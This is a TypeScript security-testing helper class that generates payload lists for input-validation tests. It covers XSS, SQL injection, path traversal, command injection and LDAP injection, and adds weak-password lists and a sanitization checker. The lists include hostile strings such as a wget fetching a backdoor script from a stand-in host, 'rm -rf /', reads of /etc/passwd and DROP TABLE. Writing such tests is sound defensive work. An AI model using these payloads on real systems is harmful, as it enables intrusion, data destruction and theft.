/**
 * Security testing utilities
 */

export class SecurityTestUtils {
  /**
   * Generate various XSS attack payloads for testing
   */
  static generateXSSPayloads(): string[] {
    return [
      // Script-based XSS
      '<script>alert("xss")</script>',
      '<SCRIPT>alert("xss")</SCRIPT>',
      '<script>alert(String.fromCharCode(88,83,83))</script>',
      '<script src="http://malicious.com/xss.js"></script>',
      
      // Event handler XSS
      '<img src=x onerror=alert("xss")>',
      '<input type="button" onclick="alert(\'xss\')" value="Click Me">',
      '<div onmouseover="alert(\'xss\')">Hover me</div>',
      '<body onload="alert(\'xss\')">',
      
      // JavaScript protocol XSS
      'javascript:alert("xss")',
      'JAVASCRIPT:alert("xss")',
      'javascript:eval(atob("YWxlcnQoJ3hzcycp"))', // base64 encoded alert('xss')
      
      // Data protocol XSS
      'data:text/html,<script>alert("xss")</script>',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=',
      
      // CSS expression XSS
      'expression(alert("xss"))',
      'url(javascript:alert("xss"))',
      
      // Mixed case and encoding
      '<ScRiPt>alert("xss")</ScRiPt>',
      '&lt;script&gt;alert("xss")&lt;/script&gt;',
      '\\u003cscript\\u003ealert("xss")\\u003c/script\\u003e',
      
      // Complex nested payloads
      '<div><script>alert("xss")</script></div>',
      '"><script>alert("xss")</script>',
      "';alert('xss');//",
      
      // Iframe and object tags
      '<iframe src="javascript:alert(\'xss\')"></iframe>',
      '<object data="javascript:alert(\'xss\')"></object>',
      '<embed src="javascript:alert(\'xss\')">',
      
      // SVG-based XSS
      '<svg onload="alert(\'xss\')">',
      '<svg><script>alert("xss")</script></svg>',
      
      // Form-based XSS
      '<form><button formaction="javascript:alert(\'xss\')">Submit</button></form>',
      '<input type="image" src="x" onerror="alert(\'xss\')">',
      
      // Meta and link tag XSS
      '<meta http-equiv="refresh" content="0;url=javascript:alert(\'xss\')">',
      '<link rel="stylesheet" href="javascript:alert(\'xss\')">',
    ]
  }

  /**
   * Generate malicious payloads for different contexts
   */
  static generateMaliciousPayloads() {
    return {
      xss: this.generateXSSPayloads(),
      
      sqlInjection: [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "admin'--",
        "admin'/*",
        "' OR 1=1#",
        "' OR 'a'='a",
      ],
      
      pathTraversal: [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
      ],
      
      commandInjection: [
        "; cat /etc/passwd",
        "| ls -la",
        "&& rm -rf /",
        "; wget http://malicious.com/backdoor.sh",
        "`cat /etc/passwd`",
        "$(ls -la)",
      ],
      
      ldapInjection: [
        "*)(uid=*",
        "admin)(&(password=*)",
        "*))%00",
      ]
    }
  }

  /**
   * Generate weak passwords for testing
   */
  static generateWeakPasswords(): string[] {
    return [
      "123456",
      "password",
      "12345678",
      "qwerty",
      "abc123",
      "123456789",
      "password123",
      "1234567890",
      "123123",
      "000000",
      "iloveyou",
      "adobe123",
      "123321",
      "admin",
      "1234567",
      "letmein",
      "photoshop",
      "1234",
      "monkey",
      "shadow",
      "sunshine",
      "12345",
      "password1",
      "princess",
      "azerty"
    ]
  }

  /**
   * Generate strong passwords for testing
   */
  static generateStrongPasswords(): string[] {
    return [
      "MyStr0ng!P@ssw0rd",
      "Tr0ub4dor&3",
      "correct-horse-battery-staple",
      "P@$$w0rd123!",
      "MyC0mpl3x&S3cur3P@ss",
      "Str0ngP@ssw0rd!2024",
      "My$up3rS3cur3P@ss!",
      "C0mpl3x!ty&Security",
      "P@ssw0rd!WithNumbers123",
      "MyLongAndComplexPassword!2024"
    ]
  }

  /**
   * Generate invalid email addresses for testing
   */
  static generateInvalidEmails(): string[] {
    return [
      "invalid-email",
      "@example.com",
      "user@",
      "user..double.dot@example.com",
      "user@.example.com",
      "user@example.",
      "user name@example.com",
      "user@example .com",
      ".user@example.com",
      "user@",
      "",
      null,
      undefined,
      "user@example..com",
      "user@@example.com",
      "user@.com",
      "<script>alert('xss')</script>@example.com",
      "javascript:alert('xss')@example.com"
    ]
  }

  /**
   * Generate valid email addresses for testing
   */
  static generateValidEmails(): string[] {
    return [
      "user@example.com",
      "test.email@example.com",
      "user+tag@example.com",
      "user123@example123.com",
      "first.last@example.co.uk",
      "user@subdomain.example.com",
      "test@localhost.localdomain",
      "user.name+tag@example.com",
      "x@example.com",
      "example@s.example"
    ]
  }

  /**
   * Test if a string is properly sanitized
   */
  static isProperlysanitized(input: string, sanitized: string): boolean {
    // Check that dangerous patterns are removed
    const dangerousPatterns = [
      /<script/i,
      /javascript:/i,
      /on\w+=/i,
      /<iframe/i,
      /<object/i,
      /<embed/i,
      /expression\s*\(/i,
      /<[^>]*>/g
    ]

    for (const pattern of dangerousPatterns) {
      if (pattern.test(sanitized)) {
        return false
      }
    }

    // Should not be empty if input had legitimate content
    if (input.replace(/<[^>]*>/g, '').trim() && !sanitized.trim()) {
      return false
    }

    return true
  }

  /**
   * Generate test data for registration form
   */
  static generateRegistrationTestData() {
    return {
      valid: {
        email: 'test@example.com',
        password: 'StrongPassword123!',
        businessIdea: 'A legitimate business idea',
        fullName: 'John Doe',
        companyName: 'Example Corp'
      },
      
      malicious: {
        email: '<script>alert("xss")</script>@example.com',
        password: 'StrongPassword123!',
        businessIdea: '<script>alert("xss")</script>Business idea',
        fullName: '<img src=x onerror=alert(1)>John Doe',
        companyName: 'javascript:alert("xss")'
      },
      
      mixed: {
        email: 'test@example.com',
        password: 'StrongPassword123!',
        businessIdea: 'Legitimate <script>alert("xss")</script> business idea',
        fullName: 'John <b>Doe</b>',
        companyName: 'Example & Co'
      }
    }
  }
}